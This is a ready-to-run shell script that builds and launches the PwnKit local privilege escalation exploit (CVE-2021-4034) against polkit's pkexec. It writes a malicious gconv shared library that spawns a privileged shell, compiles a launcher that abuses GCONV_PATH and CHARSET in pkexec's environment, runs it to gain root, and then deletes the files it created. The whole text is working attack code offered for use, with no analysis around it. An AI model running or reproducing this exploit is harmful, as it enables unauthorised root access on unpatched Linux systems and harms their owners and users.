tee pwnkit.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv(void) {
}

void gconv_init(void *step)
{
	char * const args[] = { "/bin/sh", "-pi", NULL };
	char * const environ[] = { "PATH=/bin:/usr/bin", NULL };
	execve(args[0], args, environ);
	exit(0);
}
EOF

tee cve.c <<EOF 
#include <unistd.h>

int main(int argc, char **argv)
{
	char * const args[] = {
		NULL
	};
	char * const environ[] = {
		"pwnkit.so:.",
		"PATH=GCONV_PATH=.",
		"SHELL=/lol/i/do/not/exists",
		"CHARSET=PWNKIT",
		NULL
	};
	return execve("/usr/bin/pkexec", args, environ);
}

EOF

gcc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
mkdir -p GCONV_PATH=.
cp pwnkit.so GCONV_PATH=./pwnkit.so:.
echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
gcc cve.c -o getroot
echo "[PWNKIT]"
echo "[I] Script by K4te"
echo "[I] Source code by github.com/berdav"
echo "[I] Real Author: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt"

echo "[x] compiling files"
echo "[X] Getting root..."
./getroot
rm pwnkit.so pwnkit.c cve cve.c gconv-modules GCONV_PATH=. -rf
